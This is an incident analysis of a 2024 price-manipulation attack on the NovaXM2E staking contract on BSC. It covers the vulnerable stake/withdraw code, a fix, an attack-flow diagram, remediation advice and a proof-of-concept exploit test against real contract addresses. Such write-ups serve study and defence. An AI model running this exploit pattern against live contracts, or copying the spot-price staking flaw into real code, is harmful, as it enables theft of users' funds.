# NovaXM2E — Staking Price Manipulation Sandwich Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-20 |
| **Protocol** | NovaXM2E |
| **Chain** | BSC |
| **Loss** | ~25,000 USD |
| **Attacker** | Address unidentified |
| **Attack Tx** | [0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012](https://bscscan.com/tx/0xb1ad1188d620746e2e64785307a7aacf2e8dbda4a33061a4f2fbc9721048e012) |
| **Vulnerable Contract** | [0x55C9EEbd368873494C7d06A4900E8F5674B11bD2](https://bscscan.com/address/0x55C9EEbd368873494C7d06A4900E8F5674B11bD2) |
| **Root Cause** | `stake()` converts tokens to USDT value before storing — after spot price manipulation, `withdraw()` returns more tokens than originally staked |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/NovaXM2E_exp.sol) |

---

## 1. Vulnerability Overview

The NovaXM2E staking contract's `stake(uint256 _poolId, uint256 _stakeValue)` function converted NovaXM2E tokens to their USDT equivalent and stored that value. On `withdraw()`, the stored USDT value was converted back to NovaXM2E tokens at the current spot price and paid out. The attacker borrowed a large amount of USDT via flash loan to pump the NovaXM2E price, staked at the inflated price, then sold half their position to dump the price, and finally called `withdraw()` to receive more tokens than originally staked.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: stake stores USDT value at spot price
function stake(uint256 _poolId, uint256 _stakeValue) external {
    uint256 usdtValue = _stakeValue * getTokenPrice();  // ❌ spot price used
    stakes[msg.sender] = usdtValue;  // stored as USDT value
    token.transferFrom(msg.sender, address(this), _stakeValue);
}

function withdraw(uint256 _stakeId) external {
    uint256 usdtValue = stakes[msg.sender];
    uint256 tokenAmount = usdtValue / getTokenPrice();  // ❌ reverse-calculated at current spot price
    token.transfer(msg.sender, tokenAmount);  // over-pays based on manipulated price
}

// ✅ Correct code: store token quantity directly at stake time
function stake(uint256 _poolId, uint256 _stakeValue) external {
    stakes[msg.sender] = _stakeValue;  // ✅ store token quantity directly
    token.transferFrom(msg.sender, address(this), _stakeValue);
}

function withdraw(uint256 _stakeId) external {
    uint256 tokenAmount = stakes[msg.sender];  // ✅ return original quantity as-is
    token.transfer(msg.sender, tokenAmount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: NovaXM2E_decompiled.sol
contract NovaXM2E {
    function withdraw(uint256 p0) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V2 Flash Swap: borrow 500,000 USDT
  │
  ├─[2]─► Swap USDT → NovaXM2E (large buy → price pumps)
  │
  ├─[3]─► tokenStake.stake(0, NovaXM2E balance / 2)
  │         └─► USDT value recorded at inflated price
  │
  ├─[4]─► Swap half of NovaXM2E → USDT (price dumps)
  │
  ├─[5]─► Query stakeIndex = tokenStake.stakeIndex()
  │
  ├─[6]─► Call tokenStake.withdraw(stakeIndex)
  │         └─► reverse-calculated at deflated price → receive more NovaXM2E
  │
  ├─[7]─► Swap additional NovaXM2E → USDT
  │
  ├─[8]─► Repay flash swap
  │
  └─[9]─► Total loss: ~25,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    ITokenStake tokenStake = ITokenStake(0x55C9EEbd368873494C7d06A4900E8F5674B11bD2);
    IERC20 NovaXM2E = IERC20(0xB800AFf8391aBACDEb0199AB9CeBF63771FcF491);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    function pancakeCall(address, uint256, uint256, bytes calldata) public {
        // [2] Buy large amount of NovaXM2E with USDT (price pumps)
        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));

        // [3] Stake half at inflated price
        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));
        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);

        // [4] Sell half to dump the price
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // [6] withdraw — receive more tokens at deflated price
        uint256 stakeIndex = tokenStake.stakeIndex();
        tokenStake.withdraw(stakeIndex);

        // [7] Sell additional NovaXM2E
        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));

        // [8] Repay flash swap
        USDT.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation — `stake()` converts token→USDT value using DEX spot price; after price manipulation, `withdraw()` can extract more tokens |
| **Attack Technique** | Stake/Withdraw Spot Price Sandwich (flash loan used as auxiliary funding mechanism) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Store token quantity directly**: Do not convert tokens to USDT value at stake time — store the raw token quantity instead.
2. **Use TWAP oracle**: When price conversion is necessary, use a TWAP rather than the spot price.
3. **Staking lock period**: Introduce a minimum lock period to prevent immediate `withdraw()` right after staking.
4. **Prohibit same-block stake/withdraw**: Restrict `stake` and `withdraw` from being called within the same transaction or block.

## 7. Lessons Learned

- **Value vs. quantity storage**: Staking contracts must record token quantities rather than USDT values to be safe against price manipulation.
- **Sandwich attack**: The pattern of staking at a high price and withdrawing at a low price can be used to extract funds at a loss to the protocol.
- **Flash loan + staking combination**: Combining flash-loan-driven price manipulation with staking mechanics is a common attack vector.